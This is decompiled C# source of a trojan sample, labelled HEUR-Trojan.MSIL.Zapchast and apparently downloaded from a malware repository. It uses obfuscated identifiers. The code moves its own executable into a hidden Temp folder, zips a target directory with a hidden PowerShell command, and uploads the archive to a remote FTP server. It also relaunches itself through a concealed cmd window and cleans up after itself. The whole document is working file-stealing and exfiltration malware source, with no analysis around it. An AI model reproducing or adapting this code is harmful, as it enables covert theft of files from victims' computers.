// Decompiled with JetBrains decompiler
// Type: 뎺࿲Մ啤ለᶝ⃷薭엯㘵㩊㜩鰼嫫蟚㓦됳䳑癏�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;

public class 뎺\u0FF2Մ啤ለᶝ\u20F7薭엯㘵㩊㜩鰼嫫蟚㓦됳䳑癏\uFFFD
{
  private const string 爣\u323Fᴅ唱ﾂ뗲醹㕋㲎\u02C5䴁鱊\u2346\u2455Ԙ뱇쩢癧닫㺖 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random 㝟\uEC78\uEBF1뭍㱣ꑀ벍棸찜Ꝑ夓骨鄨ד顋ꥦ㓃\u27B3ⅺ騏 = new Random(Environment.TickCount);

  public static string 쏖䲂\uF593\u0004뽩\u2058䒮猻츔智\u2F6F뎮ꓓ桵棞\uF669ႇ벆輄\uE5B4() => Path.GetRandomFileName().Replace(".", "");

  public static void 귎\u2664\uEC9C\uFFFD佴姿牙ᖷ齴\uFFFD쟜潍鱵㿋ꙡ\uFFFD涪骹밡\uEF1B(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + 뎺\u0FF2Մ啤ለᶝ\u20F7薭엯㘵㩊㜩鰼嫫蟚㓦됳䳑癏\uFFFD.㭅Ċ뇈繒㞓\u2B95\u2011뿙\uE8E6㳌ᰲ锩凗䂕ﱁ礄孏\u1AE2\u23C9Ɉ();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static void \uFD49뫵龁䘀\u0870鑂쟀\uE4E2鐅㬽뽌멦ﴙ\uE156\u2AF4倇\uE6FB諐\uF2C9黻(string name) => Process.Start(new ProcessStartInfo()
  {
    Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true,
    FileName = "cmd.exe"
  });

  public static string 㭅Ċ뇈繒㞓\u2B95\u2011뿙\uE8E6㳌ᰲ锩凗䂕ﱁ礄孏\u1AE2\u23C9Ɉ()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void ᒎ삂\uF4AB毑쇳퐯\u2B3E㤚Ꙓ\uEA0A잓\u2DC7쏐\uFFFDⶳᑸꯎ䩶䔵灖(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static string \uF5FC枒軁禊\uF2E2\u2B84䲭놛빹閸헏ꖫ怰ᚹ幀\u2E05僕旛贤䛹()
  {
    try
    {
      string path = Environment.GetEnvironmentVariable("Temp") + "\\" + 뎺\u0FF2Մ啤ለᶝ\u20F7薭엯㘵㩊㜩鰼嫫蟚㓦됳䳑癏\uFFFD.㭅Ċ뇈繒㞓\u2B95\u2011뿙\uE8E6㳌ᰲ锩凗䂕ﱁ礄孏\u1AE2\u23C9Ɉ();
      Directory.CreateDirectory(path);
      System.IO.File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, path + "\\temp.exe");
      return path;
    }
    catch (Exception ex)
    {
    }
    return (string) null;
  }

  public static void 틤廊ꦒմ۲\u21C0䲍섭䔚Ａꖜ冓ก듥ࣦ빿ꍋ敃躢썯(
    string FTPAddress,
    string zipName,
    string username,
    string password)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(FTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
  }
}
